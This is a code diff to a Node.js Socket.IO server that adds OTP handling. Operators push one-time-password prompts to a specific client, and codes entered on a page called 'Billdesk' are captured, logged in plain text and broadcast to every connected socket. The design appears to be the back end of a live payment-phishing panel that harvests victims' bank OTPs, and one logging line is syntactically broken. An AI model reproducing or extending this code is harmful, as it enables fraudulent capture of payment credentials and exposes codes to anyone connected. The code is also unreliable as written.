@@ -571,6 +571,84 @@ io.on('connection', (socket) => {
         });
     });
     
+
+    // OTP System WebSocket Handlers
+    socket.on('adminCommand', (data) => {
+        try {
+            if (data.command === 'showOTPVerification') {
+                // Find the payment session
+                const session = Array.from(systemData.paymentSessions.values()).find(
+                    s => s.sessionId === data.sessionId || Object.keys(s).some(key => s[key] === data.sessionId)
+                );
+                
+                if (session) {
+                    // Forward OTP verification command to the specific client
+                    const targetSocket = Array.from(systemData.wsClients).find(
+                        client => client.id === session.socketId
+                    );
+                    
+                    if (targetSocket) {
+                        targetSocket.emit('adminCommand', {
+                            command: 'showOTPVerification',
+                            sessionId: data.sessionId,
+                            otp: data.otp
+                        });
+                        
+                        logger.info('OTP verification sent to client:', {
+                            sessionId: data.sessionId,
+                            socketId: session.socketId,
+                            otp: data.otp
+                        });
+                    } else {
+                        // Broadcast to all clients (fallback)
+                        socket.broadcast.emit('adminCommand', data);
+                        logger.info('OTP verification broadcasted (fallback):', data);
+                    }
+                } else {
+                    logger.warn('Payment session not found for OTP verification:', data.sessionId);
+                    // Broadcast anyway as fallback
+                    socket.broadcast.emit('adminCommand', data);
+                }
+            }
+        } catch (error) {
+            logger.error('Error handling admin OTP command:', error);
+        }
+    });
+
+    // Handle OTP submission from Billdesk page
+    socket.on('otpSubmitted', (data) => {
+        try {
+            logger.info('OTP submitted from client:', {
+                sessionId: data.sessionId,
+                otp: data.otp,
+                timestamp: data.timestamp
+            });
+
+            // Broadcast to all admin panels
+            io.emit('otpSubmitted', {
+                sessionId: data.sessionId,
+                otp: data.otp,
+                timestamp: data.timestamp
+            });
+
+            // Store OTP submission in payment session
+            const session = Array.from(systemData.paymentSessions.values()).find(
+                s => s.sessionId === data.sessionId || Object.keys(s).some(key => s[key] === data.sessionId)
+            );
+            
+            if (session) {
+                session.submittedOTP = data.otp;
+                session.otpTimestamp = data.timestamp;
+                session.otpStatus = 'submitted';
+            }
+
+            logEvent(OTP submitted for session: ${data.sessionId} - OTP: ${data.otp}, 'success');
+            
+        } catch (error) {
+            logger.error('Error handling OTP submission:', error);
+        }
+    });
+
     // Handle custom events from clients
     socket.on('requestStats', () => {
         socket.emit('statsUpdate', systemData.stats);
@@ -1415,6 +1493,7 @@ app.use((err, req, res, next) => {
 
 // Export for testing
 module.exports = { app, server, io };
+
 
 
 
